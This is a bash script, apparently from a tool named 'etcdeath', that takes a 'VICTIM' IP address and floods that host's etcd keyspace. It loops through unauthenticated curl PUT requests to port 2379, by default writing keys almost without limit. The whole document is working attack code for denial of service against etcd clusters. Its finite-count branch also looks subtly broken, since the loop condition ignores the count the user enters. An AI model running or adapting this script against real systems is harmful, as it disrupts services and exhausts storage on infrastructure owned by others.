#!/bin/bash

ARG=$1

if [[ -z "$ARG" && -z "$VICTIM" ]] ; then
	echo "You must specify an IP address or hostname, or have the VICTIM env var set"
	echo "See https://github.com/jdumars/etcdeath for more documentation."
	exit 0
fi

if [[ -z "$1" ]] ; then
	IP=$VICTIM
else
	IP=$1
fi

# Flood etcd keyspace

# Determine if md5 or md5sum

which md5sum
if [[ $? -eq 1 ]] ; then
	MD5=`which md5`
else
	MD5=`which md5sum`
fi

printf '\n'
printf 'Key count to write to etcd [ infinite ] : '
read -r COUNT

if [[ -z "$COUNT" ]] ; then
	
	COUNT=1

	while [[ $COUNT -lt 999999999999 ]] ; do

		VAL=`echo $COUNT | $MD5 | cut -f1 -d ' ' `
		curl -L -X PUT http://$IP:2379/v2/keys/$VAL -d value="$COUNT"
		COUNT=$[COUNT+1]
	done
	exit 0

else
	INC=1
	while [[ $COUNT -le $INC ]] ; do

    VAL=`echo $COUNT | $MD5 | cut -f1 -d ' '`
    curl -L -X PUT http://$IP:2379/v2/keys/$VAL -d value="$COUNT"
    COUNT=$[COUNT+1]
  done
  exit 0

fi
	
